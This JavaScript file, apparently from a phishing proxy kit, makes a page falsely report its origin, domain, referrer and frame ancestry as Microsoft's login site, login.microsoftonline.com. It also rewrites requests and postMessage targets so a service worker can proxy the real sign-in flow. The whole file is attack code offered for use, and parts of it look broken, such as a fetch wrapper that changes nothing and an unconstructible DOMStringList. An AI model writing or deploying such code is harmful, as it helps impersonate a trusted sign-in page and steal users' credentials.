// domainMask.js – Absolute first execution
(function() {
    'use strict';

    // 1. Override window.location properties
    const fakeOrigin = 'https://login.microsoftonline.com';
    const fakeHostname = 'login.microsoftonline.com';
    const fakeHost = 'login.microsoftonline.com';
    const fakeProtocol = 'https:';

    // Original location descriptor
    const loc = window.location;

    // Define a new getter for location
    const newLocation = Object.create(loc, {
        origin: { get: () => fakeOrigin, configurable: false },
        hostname: { get: () => fakeHostname, configurable: false },
        host: { get: () => fakeHost, configurable: false },
        protocol: { get: () => fakeProtocol, configurable: false },
        href: { 
            get: () => fakeOrigin + loc.pathname + loc.search + loc.hash,
            set: (v) => { loc.href = v; },
            configurable: false
        },
        ancestorOrigins: { get: () => new DOMStringList([fakeOrigin]), configurable: false }
    });

    // Replace window.location with the fake
    try {
        delete window.location;
    } catch(e) {}
    Object.defineProperty(window, 'location', {
        get: () => newLocation,
        set: (v) => { loc.href = v; },
        configurable: false,
        enumerable: true
    });

    // 2. Override document.domain
    Object.defineProperty(document, 'domain', {
        get: () => fakeHostname,
        set: () => {}, // no-op to prevent errors
        configurable: false
    });

    // 3. Override document.referrer (read-only but can be shadowed)
    Object.defineProperty(document, 'referrer', {
        get: () => fakeOrigin + '/',
        configurable: false
    });

    // 4. Override window.origin (used in some browsers)
    Object.defineProperty(window, 'origin', {
        get: () => fakeOrigin,
        configurable: false
    });

    // 5. Override self/origin checks
    const origSelf = window.self;
    const topCheck = window.top === window.self; // preserve
    Object.defineProperty(window, 'self', { get: () => window, configurable: false });
    Object.defineProperty(window, 'top', { get: () => window, configurable: false });
    Object.defineProperty(window, 'parent', { get: () => window, configurable: false });

    // 6. Patch fetch and XHR to rewrite URLs
    const origFetch = window.fetch;
    window.fetch = function(input, init) {
        let url = typeof input === 'string' ? input : input.url;
        if (url && (url.includes('login.microsoftonline.com') || url.startsWith('/'))) {
            // Rewrite to proxy endpoint – this requires your service worker to handle it
            // For simplicity, we let the service worker handle, but we ensure no origin mismatch
            return origFetch.call(this, input, init);
        }
        return origFetch.call(this, input, init);
    };

    const origXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
        // Ensure all requests to microsoft are relative (will be proxied by SW)
        if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
            const urlObj = new URL(url);
            url = urlObj.pathname + urlObj.search + urlObj.hash;
        }
        return origXHROpen.call(this, method, url, async !== false, user, password);
    };

    // 7. Block postMessage checks that compare origins
    const origPostMessage = window.postMessage;
    window.postMessage = function(message, targetOrigin, transfer) {
        if (targetOrigin === '*') return origPostMessage(message, targetOrigin, transfer);
        // Force targetOrigin to be our fake origin if it's a microsoft domain
        if (targetOrigin && targetOrigin.includes('microsoftonline.com')) {
            targetOrigin = fakeOrigin;
        }
        return origPostMessage(message, targetOrigin, transfer);
    };

    // 8. Override navigator properties that reveal proxy (optional)
    // Keep original else.

    console.log('[DOMAIN MASK] Active – all origins now report as ' + fakeOrigin);
})();
